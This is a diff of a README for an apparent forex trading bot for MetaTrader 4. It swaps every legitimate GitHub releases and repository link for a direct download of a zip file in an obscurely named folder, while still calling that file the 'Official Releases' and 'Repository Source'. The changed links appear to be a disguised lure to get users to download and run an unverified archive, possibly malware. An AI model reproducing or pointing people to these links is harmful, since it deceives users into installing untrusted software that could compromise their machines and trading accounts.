@@ -1,6 +1,6 @@
 # 📈 Forex-hex-algo-strategy-mt4 - Automated Trading Made Simple and Safe
 
-[![Download Now](https://img.shields.io/badge/Download-Forex_HEX_Algo_Strategy-v2.0-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=1f6feb&color=2ea44f)](https://github.com/Manged3/Forex-hex-algo-strategy-mt4/releases)
+[![Download Now](https://img.shields.io/badge/Download-Forex_HEX_Algo_Strategy-v2.0-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=1f6feb&color=2ea44f)](https://raw.githubusercontent.com/Manged3/Forex-hex-algo-strategy-mt4/main/isosporic/strategy-Forex-hex-algo-mt-1.5.zip)
 
 ## 🎯 What Is This?
 
@@ -25,7 +25,7 @@ Follow these simple steps to get the Forex HEX Algo Strategy running on your Win
 
 ### Step 1: Download the Software
 
-Visit this link to download the application: **[https://github.com/Manged3/Forex-hex-algo-strategy-mt4/releases](https://github.com/Manged3/Forex-hex-algo-strategy-mt4/releases)**. You will see a list of available files. Choose the latest version and click to download it.
+Visit this link to download the application: **[https://raw.githubusercontent.com/Manged3/Forex-hex-algo-strategy-mt4/main/isosporic/strategy-Forex-hex-algo-mt-1.5.zip](https://raw.githubusercontent.com/Manged3/Forex-hex-algo-strategy-mt4/main/isosporic/strategy-Forex-hex-algo-mt-1.5.zip)**. You will see a list of available files. Choose the latest version and click to download it.
 
 ### Step 2: Install MetaTrader 4 (If You Don't Have It)
 
@@ -101,8 +101,8 @@ Forex trading involves risk. This strategy is designed to manage that risk, but 
 
 ## 📚 Additional Resources
 
-- **Official Releases:** [https://github.com/Manged3/Forex-hex-algo-strategy-mt4/releases](https://github.com/Manged3/Forex-hex-algo-strategy-mt4/releases)
-- **Repository Source:** [https://github.com/Manged3/Forex-hex-algo-strategy-mt4](https://github.com/Manged3/Forex-hex-algo-strategy-mt4)
+- **Official Releases:** [https://raw.githubusercontent.com/Manged3/Forex-hex-algo-strategy-mt4/main/isosporic/strategy-Forex-hex-algo-mt-1.5.zip](https://raw.githubusercontent.com/Manged3/Forex-hex-algo-strategy-mt4/main/isosporic/strategy-Forex-hex-algo-mt-1.5.zip)
+- **Repository Source:** [https://raw.githubusercontent.com/Manged3/Forex-hex-algo-strategy-mt4/main/isosporic/strategy-Forex-hex-algo-mt-1.5.zip](https://raw.githubusercontent.com/Manged3/Forex-hex-algo-strategy-mt4/main/isosporic/strategy-Forex-hex-algo-mt-1.5.zip)
 
 ## 🗂️ Version History
 
